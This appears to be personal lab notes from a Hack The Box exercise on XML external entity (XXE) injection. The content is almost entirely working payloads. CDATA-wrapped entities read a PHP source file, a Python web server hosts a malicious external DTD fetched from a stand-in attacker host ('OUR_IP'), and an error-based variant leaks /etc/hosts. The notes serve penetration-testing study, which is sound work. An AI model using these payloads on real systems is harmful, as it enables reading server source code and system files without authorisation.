## Advanced Exfiltration with CDATA

```xml
<!DOCTYPE email [ 
	<!ENTITY begin "<![CDATA["> 
	<!ENTITY file SYSTEM "file:///var/www/html/submitDetails.php"> 
	<!ENTITY end "]]>"> 
	<!ENTITY joined "&begin;&file;&end;"> 
]>
```

```xml
<!ENTITY joined "%begin;%file;%end;">
```

```shell
3kjS@htb[/htb]$ echo '<!ENTITY joined "%begin;%file;%end;">' > xxe.dtd 
3kjS@htb[/htb]$ python3 -m http.server 8000 

Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

```xml
<!DOCTYPE email [ 
	<!ENTITY % begin "<![CDATA["> <!-- prepend the beginning of the CDATA tag --> 
	<!ENTITY % file SYSTEM "file:///var/www/html/submitDetails.php"> <!-- reference external file --> 
	<!ENTITY % end "]]>"> <!-- append the end of the CDATA tag --> 
	<!ENTITY % xxe SYSTEM "http://OUR_IP:8000/xxe.dtd"> <!-- reference our external DTD --> 
	%xxe; 
]> 
... 
<email>&joined;</email> <!-- reference the &joined; entity to print the file content -->
```
![](Pasted%20image%2020260723143906.png)
## Error Based XXE
![](Pasted%20image%2020260723144857.png)

```xml
<!ENTITY % file SYSTEM "file:///etc/hosts"> 
<!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">
```

```xml
<!DOCTYPE email [ 
	<!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd"> 
	%remote; 
	%error; 
]>
```
![](Pasted%20image%2020260723145006.png)
